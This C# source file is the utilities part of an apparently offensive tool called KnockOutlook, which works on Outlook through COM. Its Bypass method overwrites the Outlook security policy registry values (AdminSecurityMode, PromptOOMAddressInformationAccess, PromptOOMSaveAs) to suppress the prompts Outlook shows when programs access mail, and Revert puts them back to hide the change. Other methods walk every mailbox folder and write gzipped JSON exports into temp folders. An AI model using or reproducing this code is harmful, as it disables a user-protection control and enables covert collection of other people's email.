using Microsoft.Office.Interop.Outlook;
using Microsoft.Win32;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;

namespace KnockOutlook
{
	class Utilities
	{
		public static string GetMajorVersion(string productCode)
		{
			return string.Format("{0}.0", productCode.Split('-')[0].Substring(3, 2));
		}

		public static List<int> Bypass(string majorVersion)
		{
			List<int> values = new List<int>();
			RegistryKey outlookPolicies = Registry.CurrentUser.OpenSubKey(string.Format(@"SOFTWARE\Policies\Microsoft\Office\{0}\Outlook\Security", majorVersion), true);

			object adminSecurityMode = outlookPolicies.GetValue("AdminSecurityMode");

			if (adminSecurityMode != null)
			{
				values.Add(Convert.ToInt32(adminSecurityMode.ToString()));
			}
			else
			{
				values.Add(-1);
			}

			object promptOOMAddressInformationAccess = outlookPolicies.GetValue("PromptOOMAddressInformationAccess");

			if (promptOOMAddressInformationAccess != null)
			{
				values.Add(Convert.ToInt32(promptOOMAddressInformationAccess.ToString()));
			}
			else
			{
				values.Add(-1);
			}

			object promptOOMSaveAs = outlookPolicies.GetValue("PromptOOMSaveAs");

			if (promptOOMSaveAs != null)
			{
				values.Add(Convert.ToInt32(promptOOMSaveAs.ToString()));
			}
			else
			{
				values.Add(-1);
			}

			outlookPolicies.SetValue("AdminSecurityMode", 3, RegistryValueKind.DWord);
			outlookPolicies.SetValue("PromptOOMAddressInformationAccess", 2, RegistryValueKind.DWord);
			outlookPolicies.SetValue("PromptOOMSaveAs", 2, RegistryValueKind.DWord);
			return values;
		}

		public static void Revert(string majorVersion, List<int> snapshot)
		{
			RegistryKey outlookPolicies = Registry.CurrentUser.OpenSubKey(string.Format(@"SOFTWARE\Policies\Microsoft\Office\{0}\Outlook\Security", majorVersion), true);

			if (snapshot[0] == -1)
			{
				outlookPolicies.DeleteValue("AdminSecurityMode");
			}
			else
			{
				outlookPolicies.SetValue("AdminSecurityMode", snapshot[0], RegistryValueKind.DWord);
			}

			if (snapshot[1] == -1)
			{
				outlookPolicies.DeleteValue("PromptOOMAddressInformationAccess");
			}
			else
			{
				outlookPolicies.SetValue("PromptOOMAddressInformationAccess", snapshot[1], RegistryValueKind.DWord);
			}

			if (snapshot[2] == -1)
			{
				outlookPolicies.DeleteValue("PromptOOMSaveAs");
			}
			else
			{
				outlookPolicies.SetValue("PromptOOMSaveAs", snapshot[2], RegistryValueKind.DWord);
			}
		}

		public static string GenerateExportPath(string majorVersion)
		{
			string fileName = Path.GetRandomFileName();
			RegistryKey outlookSecurity = Registry.CurrentUser.OpenSubKey(string.Format(@"SOFTWARE\Microsoft\Office\{0}\Outlook\Security", majorVersion));

			if (outlookSecurity != null)
			{
				object value = outlookSecurity.GetValue("OutlookSecureTempFolder");

				if (value != null)
				{
					return value.ToString() + fileName;
				}
			}

			return string.Format(@"{0}\Temp\{1}", Environment.GetEnvironmentVariable("LOCALAPPDATA"), fileName);
		}

		public static string GetAccountEmailAddress(Account account)
		{
			if (string.IsNullOrEmpty(account.SmtpAddress))
			{
				AddressEntry addressEntry = account.CurrentUser.AddressEntry;

				if (addressEntry.AddressEntryUserType == OlAddressEntryUserType.olExchangeUserAddressEntry)
				{
					return addressEntry.GetExchangeUser().PrimarySmtpAddress;
				}
				else
				{
					return addressEntry.Address;
				}
			}
			else
			{
				return account.SmtpAddress;
			}
		}

		public static List<Folder> GetFolders(Folder folder)
		{
			List<Folder> folders = new List<Folder>();
			List<string> exclusions = new List<string>
			{
				"Recipient Cache",
				"Sync Issues",
				"PersonMetadata"
			};

			if (folder.Items.Count > 0 && !exclusions.Contains(folder.Name))
			{
				folders.Add(folder);
			}

			if (folder.Folders.Count > 0)
			{
				foreach (Folder childFolder in folder.Folders)
				{
					folders.AddRange(GetFolders(childFolder));
				}
			}

			return folders;
		}

		public static void Export(object obj, string path)
		{
			using (FileStream fs = File.Open(path, FileMode.OpenOrCreate, FileAccess.Write))
			{
				using (GZipStream gzs = new GZipStream(fs, CompressionMode.Compress))
				{
					using (StreamWriter sw = new StreamWriter(gzs))
					{
						using (JsonTextWriter jtw = new JsonTextWriter(sw))
						{
							jtw.Formatting = Formatting.Indented;
							jtw.IndentChar = '\t';
							jtw.Indentation = 1;
							JsonSerializer serializer = new JsonSerializer();
							serializer.NullValueHandling = NullValueHandling.Ignore;
							serializer.Serialize(jtw, obj);
						}
					}
				}
			}
		}
	}
}
